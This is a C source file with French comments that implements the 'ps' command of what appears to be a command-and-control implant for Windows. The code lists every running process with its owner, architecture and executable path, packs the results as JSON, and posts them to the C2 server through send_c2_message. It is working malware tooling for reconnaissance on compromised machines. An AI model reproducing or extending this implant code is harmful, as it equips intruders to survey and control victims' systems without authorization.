#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <windows.h>

#ifdef INCLUDE_CMD_PS

/* Récupère le nom d'utilisateur propriétaire d'un processus.
 * Retourne 1 si succès, 0 sinon. */
static int get_process_user(HANDLE hProc, char *out, DWORD out_size) {
  HANDLE hToken = NULL;
  if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
    return 0;

  DWORD needed = 0;
  GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
  TOKEN_USER *tu = (TOKEN_USER *)malloc(needed);
  if (!tu) {
    CloseHandle(hToken);
    return 0;
  }

  int ok = 0;
  if (GetTokenInformation(hToken, TokenUser, tu, needed, &needed)) {
    char domain[256] = {0};
    DWORD nlen = out_size, dlen = sizeof(domain);
    SID_NAME_USE use;
    if (LookupAccountSidA(NULL, tu->User.Sid, out, &nlen, domain, &dlen, &use))
      ok = 1;
  }
  free(tu);
  CloseHandle(hToken);
  return ok;
}

void command_ps(char *task_id, char *params) {
  (void)params;

  /* Hostname utilisé comme champ "host" dans chaque entrée de processus */
  char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
  DWORD hlen = sizeof(hostname);
  GetComputerNameA(hostname, &hlen);

  HANDLE hSnap =
      CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE) {
    send_task_response(task_id, "Error: CreateToolhelp32Snapshot failed");
    return;
  }

  /* Buffer dynamique pour le tableau JSON de processus */
  size_t buf_size = 262144; /* 256 KB initial */
  char *procs = (char *)malloc(buf_size);
  if (!procs) {
    CloseHandle(hSnap);
    send_task_response(task_id, "Error: out of memory");
    return;
  }
  procs[0] = '[';
  size_t pos = 1;
  int first = 1;
  int proc_count = 0;

  PROCESSENTRY32 pe;
  pe.dwSize = sizeof(pe);

  if (Process32First(hSnap, &pe)) {
    do {
      char username[256] = {0};
      char arch[8]       = "x64";
      char bin_path[MAX_PATH] = {0};

      HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE,
                                 pe.th32ProcessID);
      if (!hProc)
        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE,
                            pe.th32ProcessID);

      if (hProc) {
        get_process_user(hProc, username, sizeof(username));

        /* Architecture : si WOW64 → process 32-bit sur OS 64-bit */
        BOOL is_wow64 = FALSE;
        if (IsWow64Process(hProc, &is_wow64) && is_wow64)
          strcpy(arch, "x86");

        /* Chemin complet de l'exécutable */
        DWORD path_len = sizeof(bin_path);
        QueryFullProcessImageNameA(hProc, 0, bin_path, &path_len);

        CloseHandle(hProc);
      }

      /* JSON-escape les champs texte */
      char *esc_name = json_escape(pe.szExeFile);
      char *esc_user = json_escape(username);
      char *esc_path = json_escape(bin_path);
      char *esc_host = json_escape(hostname);

      /* Taille estimée de l'entrée */
      size_t entry_max = strlen(esc_name) + strlen(esc_user) +
                         strlen(esc_path) + strlen(esc_host) + 320;
      char *entry = (char *)malloc(entry_max);
      int entry_len = 0;

      if (entry) {
        entry_len = snprintf(entry, entry_max,
            "%s{"
            "\"host\":\"%s\","
            "\"process_id\":%lu,"
            "\"parent_process_id\":%lu,"
            "\"name\":\"%s\","
            "\"user\":\"%s\","
            "\"architecture\":\"%s\","
            "\"bin_path\":\"%s\""
            "}",
            first ? "" : ",",
            esc_host,
            pe.th32ProcessID,
            pe.th32ParentProcessID,
            esc_name, esc_user, arch, esc_path);

        /* Agrandir le buffer si nécessaire */
        if (pos + (size_t)entry_len + 4 >= buf_size) {
          buf_size *= 2;
          char *tmp = (char *)realloc(procs, buf_size);
          if (!tmp) { free(entry); free(esc_name); free(esc_user); free(esc_path); free(esc_host); break; }
          procs = tmp;
        }

        memcpy(procs + pos, entry, entry_len);
        pos += entry_len;
        first = 0;
        proc_count++;
        free(entry);
      }

      free(esc_name);
      free(esc_user);
      free(esc_path);
      free(esc_host);

    } while (Process32Next(hSnap, &pe));
  }
  CloseHandle(hSnap);

  procs[pos++] = ']';
  procs[pos]   = '\0';

  /* user_output contient le tableau JSON échappé pour que le browser_script
   * puisse le parser via JSON.parse(responses[0]) et afficher la table.
   * On n'envoie pas aussi "processes" pour ne pas doubler la taille du payload. */
  char *esc_procs = json_escape(procs);

  size_t msg_size = (esc_procs ? strlen(esc_procs) : 0) + strlen(task_id) + 256;
  char *msg = (char *)malloc(msg_size);
  if (!msg) {
    free(procs);
    if (esc_procs) free(esc_procs);
    send_task_response(task_id, "Error: out of memory");
    return;
  }

  snprintf(msg, msg_size,
           "{\"action\": \"post_response\", \"responses\": "
           "[{\"task_id\": \"%s\", "
           "\"user_output\": \"%s\", "
           "\"status\": \"success\", \"completed\": true}]}",
           task_id, esc_procs ? esc_procs : "[]");

  if (esc_procs) free(esc_procs);

  free(procs);

  char *resp = send_c2_message(msg);
  if (resp) free(resp);
  free(msg);
}

#endif
